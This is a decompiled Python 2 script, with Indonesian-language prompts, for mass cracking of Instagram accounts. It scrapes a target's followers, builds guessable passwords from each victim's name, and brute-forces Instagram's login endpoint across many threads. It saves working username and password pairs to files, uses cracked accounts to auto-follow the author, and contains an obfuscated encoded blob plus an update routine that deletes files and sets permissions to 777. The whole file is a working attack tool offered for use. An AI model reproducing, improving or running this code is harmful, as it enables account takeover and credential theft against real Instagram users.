a%Qw%kd%Jc%ax%Ww%Yt%gu%Il%nj%Vs%zz%Zg%Xc%Jq%Jc%Zc%Cu%Ir%gs%ad%Wa%4m%gt%cq%3k%Rx%yd%Kr%Gz%Rm%hz%dn%Gm%Fz%ff%Zb%Gj%Vu%2h%Ka%Tp%ou%Km%Cf%Qc%kq%Jo%Cp%Xj%Bs%yk%ap%Wf%5s%0d%Il%Ho%Ai%rq%Ii%lg%xf%uq%Iu%Ce%ov%ig%Kw%2f%gp%rl%Ia%il%Bd%Tt%ds%Wv%tv%zk%Zy%Xy%Nt%zt%Ia%Ei%xb%vf%Za%2b%li%uy%Lz%ib%4q%ie%Cm%gh%ke%Jj%Ch%Qi%lk%my%bb%3m%Is%go%Zf%Gg%Vn%2c%Iy%Gs%lp%ul%Io%Gn%Rp%hr%Os%gp%ob%Jq%Cl%Qm%kf%Jp%Cg%Xy%db%py%dl%Gu%gk%gv%bv%3v%Bg%lj%bb%ia%gs%in%Yr%2y%9x%vk%ao%2x%ls%lt%Lx%nh%Rm%4d%dt%Ce%Ib%sa%Im%Cd%Jv%hs%Is%io%kg%gs%Yw%Xe%Mb%gm%de%Hi%Vb%sg%am%Xh%Mu%6f%Ch%go%km%Jm%Ca%Qa%kk%Jj%Cx%Xv%Rf%1a%bo%Gf%lq%za%Lg%na%dj%yr%as%Xq%Rs%lv%Kq%Gi%Ry%lq%ds%ia%sk%is%Pg%Sm%If%rt%Zz%Gq%Fj%bv%Zo%Gl%Vs%2h%Xw%Sa%sk%io%Ox%yp%Iv%po%Cm%gp%kx%Jp%Ct%Qx%lk%my%bp%2o%xx%sc%bs%3o%dk%ff%Zt%Gj%Vz%2f%Ku%Hq%Nn%ld%ce%1h%9q%ko%Zm%Xh%Yq%st%In%Hx%Vt%zd%Zd%Xe%Jq%uz%Yy%Ww%1k%lo%Xq%2h%Re%lv%da%if%kv%Ka%Cr%Qa%ke%Jc%Cs%Wm%Ng%vm%at%yz%At%9f%Iw%Gl%9n%wv%Zs%Wn%4c%ok%In%mi%Nw%vr%bu%2e%te%pi%Ze%Sv%5z%0u%ep%Hy%Qo%ig%La%Ca%Jh%yn%Is%iq%kn%uw%cm%mv%Vj%hi%Za%Cc%gz%pz%Cb%gx%kc%Jj%Cp%Qn%lh%jz%bj%2m%9e%rz%aq%Wo%Uj%gy%Pz%Sq%Bu%7h%Iz%ml%Ni%va%bp%2k%ty%pk%Zl%Sz%Ie%6q%Im%Gp%Nz%vr%ae%3r%0i%Kl%Cj%gg%kl%Jo%Ct%Wd%Vz%sl%au%Wa%Yk%go%Ic%mc%Nk%oy%Zp%Wz%Nz%rc%ck%Gi%9s%pd%bx%na%Rw%fr%dd%Xv%Jh%si%Im%iv%Br%pk%bj%if%Bs%zz%dx%Hd%If%om%Za%Gn%Fs%0u%Yc%Vk%9e%kd%Zt%Xi%Ya%pq%Od%gj%oa%Jg%Cp%Qb%kg%Jm%cv%Ho%Jf%pe%bv%nx%Qn%gj%ar%yp%sx%iy%Xt%Gh%4f%gl%Qf%Wt%tr%1q%bj%id%Bx%Du%cq%Cz%Ir%Ke%Cq%gq%kz%Jx%Cu%Wc%Vm%sv%ar%Wv%Yc%gz%Iu%ll%Bu%sh%Za%Wd%Fu%zi%Zb%Sc%Bw%3l%Yg%Wh%ls%0r%Il%iz%Bs%pn%bq%if%Bj%zc%dk%Hb%It%ow%Zu%Gk%Ft%0t%Yr%Vh%9j%kp%Zr%Xy%Yj%pz%Ot%gp%og%Jx%Cn%Qw%kg%Jw%cg%Hh%Jv%pq%bj%nz%Qi%gb%bt%Sg%sz%iv%Ia%Dz%4n%+o%Pl%ii%Be%Ne%Ye%Wd%lz%uu%an%2j%Fs%uu%Ij%Ee%1p%vt%Zm%Gh%Ua%gc%Uk%Gg%Vb%zw%Yp%Xy%do%hs%dv%Cv%Er%hj%If%Dc%4d%+a%Ip%gm%ob%Ks%Cn%Qv%kf%Jt%Zg%Wf%xh%zk%Za%Tl%ok%Kh%Cp%Qw%kc%Jb%Cd%Xs%Bm%yz%al%Wl%5m%0s%Iu%Gu%0e%rd%Ii%lz%xw%uj%Ix%Eo%dp%hs%Zt%2h%Ff%sc%Iu%Em%xm%vk%Zv%2r%lc%ub%Lw%if%4z%us%Lq%ir%Ix%Ke%Cc%Ql%ke%Js%Ca%Wn%Vf%4a%an%Xj%Qd%on%Kr%Qf%oq%Jc%Cu%Ql%kw%Ja%Cf%gz%lp%lg%eb%Gw%Nn%ll%ct%Hr%Qd%gi%Sz%2m%Vd%5z%Yf%ml%9b%hc%cy%mm%Rk%Jj%bo%nh%Ru%ls%cc%ny%Jf%1g%cz%Hi%Qz%6q%Cj%gb%kw%Jc%Zv%Xk%hd%pp%dn%Cj%gs%ps%Ck%gb%=m%=z%')\n"""+i)
def login_dev_cookie():
	global cookie
	print "\n  Login Instagram\n"
	cok = raw_input(" Masukkan Cookie: ")
	with requests.Session() as ses_dev:
		login_coki = ses_dev.get(url_instagram, cookies={"cookie": cok}, headers=headerz)
		if "viewer_has_liked" in str(login_coki.content):
			print " Login Suksess...."
			with open("cookie.txt", "w") as tulis_coki:
				tulis_coki.write(cok)
			cookie = {"cookie": cok}
		else:
			print " Login gagal...."
			exit()

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 21:59:02.445696
c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "iqbaldev__"
		id_target = "12629128399"
	else:
		print h+"\r >>> Follow {}/{}|Chek+{}/Live+{}  ".format(str(count_foll),len(data_),len(hasil_cp), len(hasil_ok)),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_
	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print h+"\r ["+k+">-"+h+"] "+p+str(c_foll)+" "+k+username_dev+h+" Sukses Mengikuti "+p+user_target+k+" >_< \n"
		c_foll+=1
		count_foll+=1
def login_dev():
	global cookie
	print ""
	print a+"  {"+p+" Login Instagram "+a+"}"
	print m+"   ----------------"
	print garis
	username_dev = raw_input(a+" ?"+p+" Masukkan Username"+h+": ")
	pass_dev = raw_input(a+" ?"+p+" Masukkan  Sandi"+d+": ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()
			if "userId" in str(data_dev):
				print p+"\n *"+h+" Suksess Login.."
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				follow_dev(ses_dev, username_dev)
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}
			elif "checkpoint_url" in str(data_dev):
				print k+"\n Akun Cp"
			elif "Please wait" in str(data_dev):
				print m+" >>> Mainkan Mode Pesawat!! >>"
			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()
# Mau Ngapain Cuk?
def data_pencarian_dev(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			users = dev["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:01:50.629442
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	try:
		if opsi == "1":
			url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}{}".format(id_target,limit,y)
		elif opsi == "2":
			url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}{}".format(id_target,limit,y)
		else:
			exit(" Error..")
		with requests.Session() as ses_dev:
			res_dat_foll = ses_dev.get(url+post_, cookies=cookie, headers=headerz_api)
			for dev in json.loads(res_dat_foll.content)["users"]:
				try:
					username = dev["username"]+y
					nama = dev["full_name"].encode("utf-8")
					if len(status_foll) != 1:
						i = q.replace(q, "")
						print h+"\r * "+p+"Mengambil Username"+h+i+": {}".format(len(data_)),
						sys.stdout.flush()
						data_.append(username+"==>"+nama.decode("utf-8"))
						c+=1
					else:
						data_followers.append(username+y)
				except:
					pass
	except ValueError:
		exit(m+"\n  >_ IP Kena Spam, hidupkan matikan Mode Pesawat!...\n")
	except KeyboardInterrupt:
		pass
# Mau Ngapain Cuk?
lis_prox = []
c=1
def cek_proxy(proxy):
	try:
		respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3).json()["origin"]
		print " >> Live -- "+proxy
		list_proxy.append(proxy)
		c+=1
	except:
		pass

def scrap():
	lis_prox_dev = []
	url="https://free-proxy-list.net/#list"
	with requests.Session() as ses_dev:
		respon = ses_dev.get(url)
		sop = BeautifulSoup(respon.content, "html.parser")
		tbody = sop.find("tbody")
		for dev in tbody.find_all("tr"):
			prox = dev.find_all("td", class_=False)
			lis_prox_dev.append(str(prox))
			print prox
		for dev in lis_prox_dev:
			pecah = dev.split(",")
			ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
			port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
			lis_prox.append(ip+":"+port)

	with ThreadPoolExecutor(max_workers=20) as dev:
		for prox in lis_prox:
			dev.submit(cek_proxy, prox)

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:02:27.052696
def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti, nama
		da = requests.get("https://www.instagram.com/{}{}/?__a=1".format(y,username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		spasi = "                      \n"
		tampilkan_live = h+"\r ["+k+">-"+h+"]"+p+" Status: "+h+status + spasi+h+" ["+k+">-"+h+"]"+p+" Nama: "+h+ str(nama) +spasi+h+" ["+k+">-"+h+"]"+p+" pengikut: "+k+ str(pengikut) +spasi+h+" ["+k+">-"+h+"]"+p+" mengikuti: "+k+ str(mengikuti) +spasi+h+" ["+k+">-"+h+"]"+p+" Username: "+h+ username_dev +spasi+ h+" ["+k+">-"+h+"]"+p+" Password: "+h+ pass_dev +spasi
		tampilkan_chek = k+"\r ["+p+">-"+k+"]"+p+" Status: "+k+status + spasi+k+" ["+p+">-"+k+"]"+p+" Nama: "+k+ str(nama) +spasi+k+" ["+p+">-"+k+"]"+p+" pengikut: "+p+ str(pengikut) +spasi+k+" ["+p+">-"+k+"]"+p+" mengikuti: "+p+ str(mengikuti) +spasi+k+" ["+p+">-"+k+"]"+p+" Username: "+k+ username_dev +spasi+ k+" ["+p+">-"+k+"]"+p+" Password: "+k+ pass_dev +spasi
		if status == "Live":
			print tampilkan_live
		elif status == "Checkpoint":
			print tampilkan_chek
		else:
			pass
	except requests.exceptions.ConnectionError:
		if status == "":
			exit(m+"\n  >_ Tidak ada Koneksi Internet...\n")
		else:
			print h+"\r "+status+" -- "+username_dev+" | "+pass_dev+"                \n"
			pass
	except KeyError:
		if status == "":
			exit(m+"\n  >_ Akun Tidak Ditemukan...\n")
		else:
			print h+"\r "+status+" -- "+username_dev+" | "+pass_dev+"                \n"
			pass
	except ValueError:
		if status == "":
			exit(m+"\n  >_ IP Kena Spam, hidupkan matikan Mode Pesawat!...\n")
		else:
			print h+"\r "+status+" -- "+username_dev+" | "+pass_dev+"                \n"
			pass
	except:
		print h+"\r "+status+" -- "+username_dev+" | "+pass_dev+"                \n"
		pass
# Mau Ngapain Cuk?

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:03:33.627939
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	for pass_satu in pass_dev_:
		try:
			if "\n" in pass_satu:
				t_dev = "Cek"
			else:
				t_dev = "Crack"
			if c != 1:
				pass
			else:
				if len(status_foll) != 1:
					print h+"\r >>>\033[97;1m "+t_dev+" \033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m|\033[93;1mChek+{}\033[97;1m/\033[92;1mLive+{}      ".format(str(c_pw),str(count_),len(data_),len(hasil_cp), len(hasil_ok)),
					sys.stdout.flush()
					c_pw -= 1
				else:
					pass
			pass_dev = pass_satu.lower().replace("\n", "")
			try:
				if username_dev in hasil_ok or username_dev in hasil_cp:
					break
				try:
					pas = s[0]
					headerz = {"User-Agent": user_agentz_api}
					with requests.Session() as dev:
						url_scrap = "https://www.instagram.com/"
						data = dev.get(url_scrap+post_, headers=headerz).content
						crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
						token = q
					header = {
							"Accept": "*/*",
							"Accept-Encoding": "gzip, deflate, br",
							"Accept-Language": "en-US,en;q=0.5",
							"Host": "www.instagram.com",
							"X-CSRFToken": crf_token,
							"X-Requested-With": "XMLHttpRequest",
							"Referer": "https://www.instagram.com/accounts/login/",
							"User-Agent": user_agentz,}
					param = {
							"username": username_dev,
							"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), pass_dev,y),
							"optIntoOneTap": False,
							"queryParams": {},
							"stopDeletionNonce": "",
							"trustedDeviceRecords": {}}
				except:
					header = {}
					param = {}
					pass			
				with requests.Session() as ses_dev:
					url = "https://www.instagram.com/accounts/login/ajax/"
					respon = ses_dev.post(url+post_+y, data=param, headers=header)
					data_dev = json.loads(respon.content)
					time.sleep(00.1)
					if "checkpoint_url" in str(data_dev):
						cp = "Checkpoint"
						info_dev(username_dev, pass_dev, cp)
						with open("hasil_cp.txt", "a")as dev_:
							dev_.write("[Chek]==>"+username_dev+"==>|==>"+pass_dev+"\n")
						hasil_cp.append(username_dev)
						break
					elif "userId" in str(data_dev):
						live = "Live"
						if len(status_foll) != 1:
							info_dev(username_dev, pass_dev, live)
							with open("hasil_ok.txt", "a")as dev_:
								dev_.write("[Live]==>"+username_dev+"==>|==>"+pass_dev+"\n")
							hasil_ok.append(username_dev)
						else:
							hasil_ok.append("dev_id")
							follow_dev(ses_dev,username_dev)
						break
					elif "Please wait" in str(data_dev):					
						print m+"\rHidupin Matiin Mode Pesawat 2detik!"+k+" {}".format(str(c)),
						c+=1
						sys.stdout.flush()
						pass_dev_iq = [pass_dev]
						crack_dev(username_dev, pass_dev_iq)
						count_ -= 1
	 
					else:
						c = 1
						pass
			except requests.exceptions.ConnectionError:			
				print k+"\r Tidak ada koneksi Internet...!>> {}".format(str(c)),
				sys.stdout.flush()
				c+=1
				pass_dev_iq = [pass_dev]
				crack_dev(username_dev, pass_dev_iq)
				count_ -= 1
			except:
				c = 1
				pass
		except:
			c = 1
			pass
	count_+=1
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:03.572037
def crack():
	# scrap()
	global s
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()
				pw_last = y+q[0]
				s = q
				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(y+pw_nam[0]+"123")
					# pw.append(pw_nam[0]+"12345")
					pw.append(y+dat_)
				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass
def auto_follow(status_):
	global s,data_foll_,data_
	if status_ == "auto_follow":
		try:
			data_ok = open("hasil_ok.txt", "r").readlines()
			for dev in data_ok:
				s = q
				pecah = dev.split("==>")[1]
				if pecah not in data_followers:
					print p+"\r >- "+a+"Yang Belum Mengikuti:\033[93;1m {}".format(len(data_)),
					sys.stdout.flush()
					data_.append(dev+y)
			print "\n"
			with ThreadPoolExecutor(max_workers=3) as insta_foll:
				for data_foll in data_:
					try:
						fl = q[0]
						pw_foll = []
						data_foll_ = data_foll
						us_foll = data_foll_.split("==>")[1]
						pw_foll.append(data_foll_.split("==>")[3])
						insta_foll.submit(crack_dev, us_foll, pw_foll)
					except:
						pass
		except:
			pass
	elif status_ == "iqbal_dev":
		try:
			data_cp = open("hasil_cp.txt", "r").readlines()
			for dev in data_cp:
				data_.append(dev)
		except:
			exit()
		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
			for data_cek in data_cp:
				try:
					s = q[0]
					pw_cp_ = []
					user_cp = data_cek.split("==>")[1]
					pw_cp = data_cek.split("==>")[3]
					cp_ = q[0]
					pw_cp_.append(pw_cp+y)
					insta_cek_dev.submit(crack_dev, user_cp, pw_cp_)
				except:
					pass
# Mau Ngapain Cuk?

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:31.400731
c = 1
def brute(email_dev, san_dev_):
	for san_dev_1 in san_dev_:
		try:
			global c
			san_dev = san_dev_1.lower()
			with requests.Session() as dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {
								"Accept": "*/*",
								"Accept-Encoding": "gzip, deflate, br",
								"Accept-Language": "en-US,en;q=0.5",
								"Host": "www.instagram.com",
								"X-CSRFToken": crf_token,
								"X-Requested-With": "XMLHttpRequest",
								"Referer": "https://www.instagram.com/accounts/login/",
								"User-Agent": user_agentz,}
				param = {
								"username": email_dev,
								"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),
								"optIntoOneTap": False,
								"queryParams": {},
								"stopDeletionNonce": "",
								"trustedDeviceRecords": {}}
			print k+str(c)+h+" >>>"+p+" Mencoba Password: "+h+san_dev+"                "
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, headers=header)
				data_dev = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					print h+"\n ---{"+p+" Password Ditemukan "+k+">_< "+h+"}---\n"+l
					print h+" ["+k+">_"+h+"]"+p+" Status: "+k+cp
					print h+" ["+k+">_"+h+"]"+p+" Nama: "+h+nama
					print h+" ["+k+">_"+h+"]"+p+" Pengikut: "+k+str(pengikut)
					print h+" ["+k+">_"+h+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print h+" ["+k+">_"+h+"]"+p+" Username: "+h+email_dev
					print h+" ["+k+">_"+h+"]"+p+" Password: "+h+san_dev
					print ""
					break
				elif "userId" in str(data_dev):
					live = "Live"
					print h+"\n ---{"+p+" Password Ditemukan "+k+">_< "+h+"}---\n"+l
					print h+" ["+k+">_"+h+"]"+p+" Status: "+h+live
					print h+" ["+k+">_"+h+"]"+p+" Nama: "+h+nama
					print h+" ["+k+">_"+h+"]"+p+" Pengikut: "+k+str(pengikut)
					print h+" ["+k+">_"+h+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print h+" ["+k+">_"+h+"]"+p+" Username: "+h+email_dev
					print h+" ["+k+">_"+h+"]"+p+" Password: "+h+san_dev
					print ""
					break
				elif "Please wait" in str(data_dev):					
					print m+str(c)+" >>> Mainkan Mode Pesawat!! >>"+l
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				else:
					pass
					c+=1
		except requests.exceptions.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		except KeyboardInterrupt:
			exit("\n Keluar....")
		except:
			pass
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:04:56.435414
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = raw_input(a+"\n ? "+p+"Masukkan Username Target"+k+": ")
	time.sleep(2)
	print h+" * "+p+"Mengumpulkan Informasi..."
	info_dev(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for dev in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(dev))
		if len(nama_pecah) >= 1:
			for sub_dev in nama_pecah:
				word_list.append(sub_dev)
				word_list.append(sub_dev+str(dev))
		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for dev_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			for dev_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "sayang123", "bismillah", "bismilah", "bismillahh", "anjing", "anjing123", "bangsat", "bajingan", "kontol", "password","pasword", "sandi123"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print h+" * "+p+"Berhasil Membuat "+k+str(len(word_list_crack))+p+" Wordlist"
	time.sleep(2)
	print ""
	brute(user_target, word_list_crack)
# Mau Ngapain Cuk?
# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:07:45.048761
def _yuk_(iqbaldev):
	import string
	try:
		open("cokiz.txt", "r").read()
	except IOError:
		d_str = []
		fu = base64.b64encode(iqbaldev+"O")
		for str_ in str(string.ascii_lowercase):
			d_str.append(str_)
			
		for i_ in fu:
			with open("cokiz.txt", "a") as iq:
				iq.write(i_+random.choice(d_str)+"%")
def _uyuk_():
	global followerz,followerzz,fol_dev,q,wak_,y
#	try:
	fol_tam = ""
	fol_tamzz = ""
#	fol_z = open("cokiz.txt", "r").read().split("%>")
	fol_z = (">>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==%>MjAyMSAxMiAyMg==%").split("%>")
	bokep = fol_z[0]
	bokepp = fol_z[1]
	for dev_fol in fol_z[0].split("%"):
	  try:
		fol_tam += dev_fol[0]
	  except:
	  	pass
#	if platform_dev != base64.b64decode(fol_z[2]):
#		print "Ba"
	for dev_folzz in fol_z[1].split("%"):
		try:
			fol_tamzz += dev_folzz[0]
		except:
			pass
#	fol_dev = base64.b64decode(bokepp)
#	followerz = base64.b64decode(fol_tam)
#	wak_ = base64.b64decode(("MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==")).split()


	fol_dev = "prem prem joss ig " # Ultimited
	print fol_dev + "WELCOME at Mbokey"
	print fol_tamzz

	wak_ = "prem prem joss ig ".split()
	followerz = ""
	print followerz + "WELCOME AT Mbokey"


	followerzz = fol_dev.replace("U", "")
	q=followerzz
	y=""
	followerzz = base64.b64decode(fol_tam)
_uyuk_()
def pilihan(pil):
	global username_get_follow,post_
	proses_crack = h+" * "+p+"Tunggu proses Crack...!"
	post_=y
	if pil == "1":
		pas = ""
		status = ""
		username = raw_input(a+"\n ?"+p+" Masukkan Username Target"+h+": ")
		info_dev(username, pas, status)
		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username+p+" >> "+k+str(mengikuti)
		print garis
		pil2 = raw_input(a+" ?"+p+" Pilih"+k+": ")
		limit = input(a+" ?"+p+" Masukkan Limit"+k+": ")
		if pil2 == "1":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		else:
			pass
	elif pil == "2":
		print garis
		usr_ = raw_input(a+" ?"+p+" Masukkan Nama"+k+": ")
		jm = input(a+" $"+p+" Masukkan Jumlah"+h+": ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		print ""
		print proses_crack
		print "\n"
		crack()
	elif pil == "3":
		crack_target()
	elif pil == "4":
		cek_hasil()
	elif pil == "5":
		pas = ""
		status = ""
		status_foll.append("IqbalDev")
		print garis
		username_get_follow = raw_input(a+"  ?"+p+" Masukkan Username Target"+k+": ")
		info_dev(username_get_follow, pas, status)
		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username_get_follow+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username_get_follow+p+" >> "+k+str(mengikuti)
		print garis
		raw_input(p+" >_"+a+" Enter Untuk Lanjut.. ")
		print garis
		data_follower_dev(cookie, id_, limit=1000000000, opsi="1")
		pil_dev = "auto_follow"
		auto_follow(pil_dev)
	elif pil == "6":
		print h+"\n >>>"+a+" Tunggu Proses...\n"
		pil_dev = "iqbal_dev"
		auto_follow(pil_dev)
	elif pil == "7":
		import os
		try:
			os.system("git clone https://github.com/IqbalDev/insta_dev")
			os.system("rm -rf insta_dev.py")
			os.system("rm -rf install.py")
			os.system("cp -f insta_dev/* \\.")
			os.system("rm -rf insta_dev")
			os.system("chmod 777 *")
			print h+"\n Sukses Update Tool.."+p+">_<\n"
		except:
			print "\n Perangkat Tidak Suport\n"
	elif pil == "8":
		kel = raw_input(k+" > Yakin Mau Keluar dari akun Instagram? "+p+"y/n"+h+": ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " > Keluar...."
		else:
			print h+" > Silahkan Jalankan lagi toolnya.."
	elif pil == "hapus_premium":
		hapus_cokiz()
		print p+"\n >_"+h+" Premium Telah Dihapus...\n"
	else:
		print m+" Pilih yang benar...."
# Mau Ngapain Cuk?
baner = """
.__  """+h+"""+{ I G E H }+"""+a+""" __

─▄████▄████▄
██▒▒▒▒█▒▒▒▒██
▀██▒ ▒▒▒▒▒██▀
─▀██▒▒▒▒▒██▀
───▀██▒██▀
─────▀█▀
"""
versi = k+" >_"+h+" Versi_:"+p+" 0.5\n"

# Decompile by KangEhem:)
# with (uncompyle6) version : 2.10.0
# Time Succes decompile : 2021-11-21 22:09:08.369658
def menu_dev():
	pil_kon = []
	print "\n"
	belum_premium = a+" ["+p+"@"+a+"] "+m+"Belum Premium:( "
	print baner
